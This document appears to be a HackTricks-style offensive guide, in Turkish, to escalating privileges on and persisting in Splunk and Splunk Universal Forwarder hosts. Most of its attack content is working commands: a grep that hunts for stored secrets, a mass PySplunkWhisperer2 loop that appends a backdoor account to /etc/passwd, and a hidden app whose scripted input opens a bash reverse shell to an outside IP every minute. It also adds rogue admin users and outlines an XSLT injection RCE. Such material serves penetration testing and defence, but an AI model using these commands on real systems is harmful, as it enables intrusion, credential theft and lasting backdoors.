# Splunk LPE ve Persistence

{{#include ../../banners/hacktricks-training.md}}

Bir makineyi **internally** veya **externally** **enumerating** ederken **Splunk running** olduğunu (**web UI** için genellikle **8000**, management API için **8089**) fark ederseniz, geçerli kimlik bilgileri çoğu zaman app installation, scripted inputs veya management actions üzerinden **code execution** elde etmek için kullanılabilir.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Splunk **root** olarak çalışıyorsa bu durum çoğu zaman doğrudan **privilege escalation** ile sonuçlanır.<sup>[[1]](#references)</sup>

Yalnızca generic remote attack surface, enumeration veya app-upload RCE path ile ilgileniyorsanız şuraya bakın:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Zaten **root** iseniz ve Splunk service yalnızca localhost'u dinlemiyorsa, **Splunk password hashes** çalabilir, **encrypted secrets** kurtarabilir veya yerel olarak ya da birden fazla forwarder üzerinde persistence sağlamak için **malicious app** gönderebilirsiniz.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## İlginç Local Files

Splunk veya Splunk Universal Forwarder çalıştıran bir host'a erişim sağladığınızda, genellikle en ilginç path'ler şunlardır:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Önemli artifact'ler:

- **`$SPLUNK_HOME/etc/passwd`**: yerel Splunk kullanıcıları ve parola hash'leri.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: Splunk tarafından çeşitli `.conf` dosyalarında depolanan secret'ları şifrelemek için kullanılan anahtar.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: ilk admin bootstrap dosyası; gold image'larda ve provisioning hatalarında kullanışlıdır. `etc/passwd` zaten mevcutsa yok sayılır.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted input'ların yaygın olarak etkinleştirildiği yer.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** veya **`$SPLUNK_HOME/etc/apps/`**: kalıcı bir app'i gizlemek veya hâlihazırda dağıtılanları incelemek için uygun yerlerdir.<sup>[[11]](#references)</sup>

## Splunk Universal Forwarder Agent Exploit Summary

Daha fazla ayrıntı için [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) adresine bakın. Bu yalnızca bir özettir.<sup>[[1]](#references)</sup>

**Exploit özeti:**
Splunk Universal Forwarder'ı (UF) hedefleyen bir exploit, **agent password** bilgisine sahip saldırganların agent'ı çalıştıran sistemlerde arbitrary code çalıştırmasına ve potansiyel olarak ortamın büyük bir bölümünü ele geçirmesine olanak tanır.<sup>[[1]](#references)</sup>

**Neden çalışır:**

- UF management service çoğunlukla **TCP 8089** üzerinde açığa çıkar.<sup>[[6]](#references)</sup>
- Saldırganlar API'ye authenticate olabilir ve forwarder'a **malicious app bundle** yüklemesini söyleyebilir.<sup>[[1]](#references)[[5]](#references)</sup>
- Aynı primitive yerel olarak **LPE**, uzaktan ise **RCE** için kullanılabilir.<sup>[[5]](#references)</sup>
- **SplunkWhisperer2** gibi public tooling, app bundle'ı otomatik olarak oluşturur ve payload'ları Linux hedeflerine uyarlayabilir.<sup>[[5]](#references)</sup>

**Parolayı elde etmenin yaygın yolları:**

- Documentation, script'ler, share'ler veya deployment automation içinde cleartext credential'lar.<sup>[[1]](#references)</sup>
- `$SPLUNK_HOME/etc/passwd` içindeki password hash'leri ve ardından offline cracking.<sup>[[1]](#references)[[7]](#references)</sup>
- `user-seed.conf` gibi gold image'lar veya provisioning artıkları.<sup>[[1]](#references)[[9]](#references)</sup>

**Etki:**

- Ele geçirilen her host üzerinde SYSTEM/root-level code execution.<sup>[[1]](#references)</sup>
- Persistent app'lerin, backdoor'ların veya ransomware'in dağıtılması.<sup>[[1]](#references)</sup>
- Data forward edilmeden önce telemetry'nin devre dışı bırakılması veya değiştirilmesi.<sup>[[1]](#references)</sup>

**Exploit için örnek command:**

Orijinal rapor, bir payload'ı birden fazla forwarder'a göndermek için aşağıdaki loop'u gösterir.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Kullanılabilir public exploit'ler:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Scripted Inputs veya Malicious Apps ile Persistence

`root`/`splunk` olarak **filesystem write access**'iniz veya app yüklemek için authenticated access'iniz varsa, çok güvenilir bir persistence mekanizması **scripted input** içeren bir **custom app** bırakmaktır.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Splunk'ın kendi dokümantasyonu, scripted input'ların bir app dizini altında bulunmasını ve `inputs.conf` üzerinden etkinleştirilmesini bekler.<sup>[[10]](#references)</sup>

Tipik düzen:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimum `inputs.conf`:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Hızlı Linux dropper'ı (belgelenmiş app layout kullanılarak):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notlar:

- Aynı yöntem, `/opt/splunkforwarder/etc/apps/` kullanılarak **Universal Forwarder** üzerinde de çalışır.<sup>[[2]](#references)[[10]](#references)</sup>
- Saldırganlar, açıkça malicious bir app oluşturmak yerine genellikle meşru bir add-on'u değiştirerek araya karışır.<sup>[[2]](#references)</sup>
- Bir **deployment server** üzerinde malicious bir app'i `deployment-apps/` içine yerleştirmek, forwarder'lar güncellenmiş app'leri sorgulayıp indirdiği ve uygulamak için çoğu zaman yeniden başlatıldığı için **filo genelinde persistence**'a dönüşür.<sup>[[11]](#references)[[12]](#references)</sup>

## Credential Theft and Admin Takeover

Splunk'ın yerel dosyalarını okuyabiliyorsanız genellikle iki iyi hedef vardır: **Splunk admin erişimini** ve **encrypted service credentials** bilgilerini kurtarmak.<sup>[[8]](#references)</sup>

### Password hashes and local users

Splunk, yerel authentication verilerini `etc/passwd` içinde saklar. Deployment'a bağlı olarak bu dosyayı crack etmek, web UI ve management API için geçerli credentials bilgilerini kurtarabilir.<sup>[[1]](#references)[[7]](#references)</sup>

Zaten geçerli **admin** credentials bilgilerine sahipseniz ve Splunk **native** authentication backend'ini kullanıyorsa, persistence için CLI'ın kendisi kullanılabilir.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` ve şifrelenmiş değerler

Splunk, birden fazla yapılandırma dosyasında depolanan hassas değerleri korumak için `etc/auth/splunk.secret` dosyasını kullanır. Hem **secret** değerini hem de ilgili **`.conf` dosyalarını** ele geçirebilirseniz genellikle şunları kurtarabilir veya yeniden kullanabilirsiniz:<sup>[[8]](#references)</sup>

- `pass4SymmKey` gibi forwarder/indexer ortak secret değerleri
- `sslPassword` gibi TLS private-key parolaları
- `bindDNPassword` gibi LDAP bind kimlik bilgileri

Bu durum, Splunk admin parolasının kendisi crack edilemese bile **lateral movement** faaliyetlerini destekleyebilir.<sup>[[8]](#references)</sup>

### `user-seed.conf` abuse

`user-seed.conf` yalnızca ilk başlatma sırasında veya `etc/passwd` mevcut olmadığında kullanılır. Bu nedenle çalışan bir sistemde daha az kullanışlıdır; ancak şu durumlarda oldukça ilgi çekicidir:<sup>[[9]](#references)</sup>

- ele geçirilmiş installation template'leri
- container image'ları
- unattended provisioning workflow'ları
- Splunk'ın otomatik olarak yeniden başlatıldığı appliance'lar

Bu durumlarda, `splunk hash-passwd` ile oluşturulmuş bir `HASHED_PASSWORD` yerleştirmek, yeniden deployment sonrasında admin erişimini sessizce geri kazanmanızı sağlar.<sup>[[9]](#references)</sup>

## Splunk Queries Abuse

Daha fazla ayrıntı için [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) adresine bakın.<sup>[[3]](#references)[[4]](#references)</sup>

Yakın zamanda kullanılan etkili bir teknik, vulnerable Splunk Enterprise sürümlerinde **user-supplied XSLT** özelliğini abuse ederek düşük ayrıcalıklı, kimliği doğrulanmış bir hesabı `splunk` kullanıcısı olarak **OS command execution** elde edecek şekilde yükseltmektir.<sup>[[3]](#references)[[4]](#references)</sup>

Yüksek seviyeli akış:<sup>[[3]](#references)[[4]](#references)</sup>

1. Splunk'a authenticate olun.
2. Preview/upload functionality üzerinden malicious bir **XSL** dosyası yükleyin.
3. Splunk'ın search results sonuçlarını **dispatch** dizininden yüklenen bu stylesheet ile render etmesini sağlayın.
4. XSLT payload'ını kullanarak bir dosya yazın veya Splunk'ın search pipeline'ı üzerinden execution tetikleyin (örneğin `runshellscript` gibi internal functionality'ye ulaşarak).

Buradaki önemli offensive çıkarım, bu yöntemin **app upload gerektirmeden post-auth RCE** sağlamasıdır. Linux üzerinde genellikle **`splunk`** hesabına erişim elde edersiniz; bu yine de değerlidir, çünkü bu kullanıcı çoğunlukla application tree'nin sahibidir, secret'ları okuyabilir ve shell kaybedilse bile ayakta kalan persistent app'ler yerleştirebilir.<sup>[[3]](#references)[[4]](#references)</sup>

Exploitation sırasında kullanılan temsili path şöyledir:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Splunk çok fazla yetkiyle çalışıyorsa veya `splunk` kullanıcısının tehlikeli script'lere, yazılabilir service unit'lerine ya da hatalı `sudo` kurallarına erişimi varsa bu, temiz bir **LPE** zincirine dönüşür.

## References

- [1] [Splunk Forwarder'larını RCE ve Persistence için Kötüye Kullanma](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [TraitorWare'e Dikkat: Persistence için Splunk Kullanma](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 Analysis: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Varsayılan değerleri değiştirme](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Birden çok sunucuda güvenli parolaları dağıtma](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Scripted input ayarlama](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Deployment app'leri oluşturma](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Deployment güncellemelerinin nasıl gerçekleştiği](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [CLI ile kullanıcıları yapılandırma](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
